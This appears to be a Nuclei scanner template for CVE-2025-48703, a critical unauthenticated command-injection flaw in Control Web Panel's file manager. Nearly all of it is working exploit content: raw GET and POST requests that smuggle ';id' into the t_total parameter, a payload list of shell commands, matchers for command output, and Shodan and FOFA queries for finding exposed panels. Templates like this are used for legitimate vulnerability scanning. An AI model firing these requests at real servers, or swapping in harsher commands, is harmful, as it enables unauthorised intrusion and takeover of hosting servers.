id: CVE-2025-48703

info:
  name: CWP (Control Web Panel) < 0.9.8.1205 - Remote Code Execution
  author: Rukhnuddin786
  severity: critical
  description: |
    CWP (Control Web Panel) versions before 0.9.8.1205 are vulnerable to remote code execution due to improper input validation in the filemanager's changePerm request.
    The vulnerability allows unauthenticated attackers to execute arbitrary commands by injecting shell metacharacters into the t_total parameter.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-48703
    - https://github.com/itstarsec/CVE-2025-48703
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-48703
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-78
    cpe: cpe:2.3:a:control-webpanel:control_web_panel:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: control-webpanel
    product: control_web_panel
    shodan-query: http.title:"CWP |" http.title:"Login"
    fofa-query: title="CWP |" && title="Login"
  tags: cve,cve2025,cwp,rce,kev,kev-2024,filemanager

http:
  - raw:
      - |
        GET /filemanager/changePerm?t_total=1;id&file=test.txt&user=www-data HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
        
      - |
        POST /filemanager/changePerm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
        
        t_total=1;id&file=test.txt&user=www-data

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
          - "groups="
        condition: and
        
      - type: regex
        part: body
        regex:
          - 'uid=[0-9]+\\([^)]+\\)'
          - 'gid=[0-9]+\\([^)]+\\)'
        condition: and

    extractors:
      - type: regex
        part: body
        name: user
        internal: true
        regex:
          - 'uid=[0-9]+\\([^)]+)'
          - 'uid=([0-9]+)'

    payloads:
      rce:
        - "id"
        - "whoami"
        - "uname -a"

    attack: pitchfork
    threads: 1
    max-redirects: 2
    stop-at-first-match: true

  - method: GET
    path:
      - "/"
    matchers:
      - type: word
        words:
          - "CWP |"
          - "Control Web Panel"
        condition: or
        part: body
    extractors:
      - type: regex
        part: body
        name: version
        internal: true
        regex:
          - "CWP (\\d+\\.\\d+\\.\\d+\\.\\d+)"
    stop-at-first-match: true

  - method: GET
    path:
      - "/login/index.php"
    matchers:
      - type: word
        words:
          - "CWP |"
          - "Login to CWP"
        condition: or
        part: body
    stop-at-first-match: true

# Debug information for validation
# 1. The vulnerability is triggered by injecting shell metacharacters into the t_total parameter
# 2. A valid username (non-root) is required for exploitation (commonly 'www-data' works)
# 3. The file parameter should point to an existing file on the system
# 4. Expected response will contain command output if vulnerable

# Example usage:
# nuclei -t CVE-2025-48703-cwp-rce.yaml -u https://target.com -v

# For debugging, use the following command to see full request/response:
# nuclei -t CVE-2025-48703-cwp-rce.yaml -u https://target.com -debug -v
